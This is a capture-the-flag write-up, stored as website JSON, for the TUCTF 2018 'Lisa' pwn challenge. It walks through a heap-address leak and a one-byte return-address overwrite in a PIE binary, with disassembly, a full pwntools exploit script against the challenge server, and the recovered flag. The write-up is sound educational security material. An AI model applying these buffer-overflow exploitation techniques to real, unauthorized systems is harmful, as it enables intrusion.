{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/tu-ctf-2018/pwn/lisa/jaiverma","result":{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=rop\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Lisa</h1>\n<p>We are given a <a href=\"/6a7e7450265eb221d2228d9fa5a92e98/lisa.\">binary</a> which leaks a heap address and has a stack based buffer overflow allowing us to overwrite at most 1 byte of the saved return address.</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/lisa$ file lisa\nlisa: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7f2cd300a5518deec5cb00e27dae466022fdacd9, not stripped\n</code></pre>\n<p><code>PIE</code> and <code>NX</code> enabled.</p>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : Partial\n</code></pre>\n<p>With these constraints, we can jump to the following locations:</p>\n<pre><code class=\"language-assembly\">...\n│           0x00000d01      8d8340000000   lea eax, [ebx + 0x40]       ; \"4\" ; '@'\n│           0x00000d07      8b10           mov edx, dword [eax]\n│           0x00000d09      8d8348000000   lea eax, [ebx + 0x48]       ; 'H'\n│           0x00000d0f      8b00           mov eax, dword [eax]\n│           0x00000d11      6a2b           push 0x2b                   ; '+' ; size_t nbyte\n│           0x00000d13      52             push edx                    ; void *buf\n│           0x00000d14      50             push eax                    ; int fildes\n│           0x00000d15      e836f8ffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)\n│           0x00000d1a      83c40c         add esp, 0xc\n│           0x00000d1d      e89cfaffff     call sym.checkPass\n│           0x00000d22      b800000000     mov eax, 0\n│           0x00000d27      8b5dfc         mov ebx, dword [local_4h]\n│           0x00000d2a      c9             leave\n└           0x00000d2b      c3             ret\n...\n</code></pre>\n<p>Essentially, we can jump to any location between <code>0xd00</code> and <code>0xdff</code>.</p>\n<p>The initial user input is conveniently stored in such a manner that when we return from the call to <code>sym.checkPass</code>, our initial input is stored on the top of the stack giving us full control with a ROP chain. One caveat though is that we don't have an infoleak to give us a binary address which is unfortunately necessary as the binary is compiled with <code>PIE</code>.</p>\n<pre><code class=\"language-assembly\">[0x000005f0]> pdf @sym.checkPass\n┌ (fcn) sym.checkPass 68\n│   sym.checkPass ();\n│           ; var int local_18h @ ebp-0x18\n│           ; CALL XREF from sym.main (0xd1d)\n│           0x000007be      55             push ebp\n│           0x000007bf      89e5           mov ebp, esp\n│           0x000007c1      83ec18         sub esp, 0x18\n│           0x000007c4      e863050000     call sym.__x86.get_pc_thunk.ax\n│           0x000007c9      0537380000     add eax, 0x3837             ; '78'\n│           0x000007ce      8d9040000000   lea edx, [eax + 0x40]       ; \"4\" ; '@'\n│           0x000007d4      8b12           mov edx, dword [edx]\n│           0x000007d6      8d8044000000   lea eax, [eax + 0x44]       ; 'D'\n│           0x000007dc      8b00           mov eax, dword [eax]\n│           0x000007de      52             push edx\n│           0x000007df      50             push eax\n│           0x000007e0      e8aeffffff     call sym.doStrcmp\n│           0x000007e5      83c408         add esp, 8\n│           0x000007e8      85c0           test eax, eax\n│       ┌─&#x3C; 0x000007ea      7407           je 0x7f3\n│       │   0x000007ec      e811000000     call sym.lisa\n│      ┌──&#x3C; 0x000007f1      eb0c           jmp 0x7ff\n│      ││   ; CODE XREF from sym.checkPass (0x7ea)\n│      │└─> 0x000007f3      8d45e8         lea eax, [local_18h]\n│      │    0x000007f6      50             push eax\n│      │    0x000007f7      e864ffffff     call sym.fail\n│      │    0x000007fc      83c404         add esp, 4\n│      │    ; CODE XREF from sym.checkPass (0x7f1)\n│      └──> 0x000007ff      90             nop\n│           0x00000800      c9             leave\n└           0x00000801      c3             ret\n</code></pre>\n<p>If we can somehow call <code>sym.lisa</code>, we can print out the flag.</p>\n<p>The heap address which is leaked is the address of where the password to which the input is compared to is stored. By returning to the call to <code>read</code> in <code>main</code>, we can overwrite the stored password with 0x0 bytes allowing us to pass the password check and therefore calling <code>lisa</code>.</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/lisa$ ./lisa\nHere's your share: 0x56bc7008\nWhat? The Mona Lisa!\nLook, if you want somethin' from me, I'm gonna need somethin' from you alright...\n</code></pre>\n<p>Exploit:</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux')\n# p = process('./lisa')\np = remote('18.191.244.121', 12345)\n\np.recvuntil('share: ')\nleak = p.recvuntil('\\n').strip()\nleak = int(leak, 16)\nheap_base = leak &#x26; 0xfffffff0\n\npayload = ''\npayload += p32(0)\npayload += p32(leak)\npayload += p32(1)\np.sendline(payload)\n\npayload = ''\npayload += 'a' * 24\npayload += 'cccc'\npayload += '\\x15'\npayload = payload.ljust(0x2b, '\\x00')\n\np.send(payload)\np.send('\\x00')\n\ns = p.recv()\nprint s\np.interactive()\n</code></pre>\n<p>Flag</p>\n<pre><code>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!>''''''&#x3C;!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!'''''`             ``'!!!!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!!!''`          .....         `'!!!!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!'`      .      :::::'            `'!!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!'     .   '     .::::'                `!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!'      :          `````                   `!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!        .,cchcccccc,,.                       `!!!!!!!!!!!!\n!!!!!!!!!!!!!!!     .-\"?$$$$$$$$$$$$$$c,                      `!!!!!!!!!!!\n!!!!!!!!!!!!!!    ,ccc$$$$$$$$$$$$$$$$$$$,                     `!!!!!!!!!!\n!!!!!!!!!!!!!    z$$$$$$$$$$$$$$$$$$$$$$$$;.                    `!!!!!!!!!\n!!!!!!!!!!!!    &#x3C;$$$$$$$$$$$$$$$$$$$$$$$$$$:.                    `!!!!!!!!\n!!!!!!!!!!!     $$$$$$$$$$$$$$$$$$$$$$$$$$$h;:.                   !!!!!!!!\n!!!!!!!!!!'     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$h;.                   !!!!!!!\n!!!!!!!!!'     &#x3C;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                   !!!!!!!\n!!!!!!!!'      `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F                   `!!!!!!\n!!!!!!!!        c$$$$???$$$$$$$P\"\"  \"\"\"??????\"                      !!!!!!\n!!!!!!!         `\"\" .,.. \"$$$$F    .,zcr                            !!!!!!\n    TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}\n!!!!!!!!        &#x3C;. $$c= &#x3C;$d$$$   &#x3C;$$$$=-=+\"$$$$$$$                  !!!!!!\n!!!!!!!         d$$$hcccd$$$$$   d$$$hcccd$$$$$$$F                  `!!!!!\n!!!!!!         ,$$$$$$$$$$$$$$h d$$$$$$$$$$$$$$$$                   `!!!!!\n!!!!!          `$$$$$$$$$$$$$$$&#x3C;$$$$$$$$$$$$$$$$'                    !!!!!\n!!!!!          `$$$$$$$$$$$$$$$$\"$$$$$$$$$$$$$P>                     !!!!!\n!!!!!           ?$$$$$$$$$$$$??$c`$$$$$$$$$$$?>'                     `!!!!\n!!!!!           `?$$$$$$I7?\"\"    ,$$$$$$$$$?>>'                       !!!!\n!!!!!.           &#x3C;&#x3C;?$$$$$$c.    ,d$$?$$$$$F>>''                       `!!!\n!!!!!!            &#x3C;i?$P\"??$$r--\"?\"\"  ,$$$$h;>''                       `!!!\n!!!!!!             $$$hccccccccc= cc$$$$$$$>>'                         !!!\n!!!!!              `?$$$$$$F\"\"\"\"  `\"$$$$$>>>''                         `!!\n!!!!!                \"?$$$$$cccccc$$$$??>>>>'                           !!\n!!!!>                  \"$$$$$$$$$$$$$F>>>>''                            `!\n!!!!!                    \"$$$$$$$$???>'''                                !\n!!!!!>                     `\"\"\"\"\"                                        `\n!!!!!!;                       .                                          `\n!!!!!!!                       ?h.\n!!!!!!!!                       $$c,\n!!!!!!!!>                      ?$$$h.              .,c\n!!!!!!!!!                       $$$$$$$$$hc,.,,cc$$$$$\n!!!!!!!!!                  .,zcc$$$$$$$$$$$$$$$$$$$$$$\n!!!!!!!!!               .z$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n!!!!!!!!!             ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$          .\n!!!!!!!!!           ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$         !!\n!!!!!!!!!         ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$        ,!'\n!!!!!!!!>        c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$.       !'\n!!!!!!''       ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>       '\n!!!''         z$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>\n!'           ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>             ..\n            z$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'           ;!!!!''`\n            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       ,;;!'`'  .''\n           &#x3C;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>    ,;'`'  ,;\n           `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F   -'   ,;!!'\n            \"?$$$$$$$$$$?$$$$$$$$$$$$$$$$$$$$$$$$$$F     .&#x3C;!!!'''       &#x3C;!\n         !>    \"\"??$$$?C3$$$$$$$$$$$$$$$$$$$$$$$$\"\"     ;!'''          !!!\n       ;!!!!;,      `\"''\"\"????$$$$$$$$$$$$$$$$\"\"   ,;-''               ',!\n      ;!!!!&#x3C;!!!; .                `\"\"\"\"\"\"\"\"\"\"\"    `'                  ' '\n      !!!! ;!!! ;!!!!>;,;, ..                  ' .                   '  '\n     !!' ,;!!! ;'`!!!!!!!!;!!!!!;  .        >' .''                 ;\n    !!' ;!!'!';! !! !!!!!!!!!!!!!  '         -'\n   &#x3C;!!  !! `!;! `!' !!!!!!!!!!&#x3C;!       .\n   `!  ;!  ;!!! &#x3C;' &#x3C;!!!! `!!! &#x3C;       /\n  `;   !>  &#x3C;!! ;'  !!!!'  !!';!     ;'\n   !   !   !!! !   `!!!  ;!! !      '  '\n  ;   `!  `!! ,'    !'   ;!'\n      '   /`! !    &#x3C;     !! &#x3C;      '\n           / ;!        >;! ;>\n             !'       ; !! '\n          ' ;!        > ! '\n            '\n</code></pre>\n<blockquote>\n<p>TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}</p>\n</blockquote>","relativePath":"writeups/tu-ctf-2018/pwn/lisa/jaiverma"}}}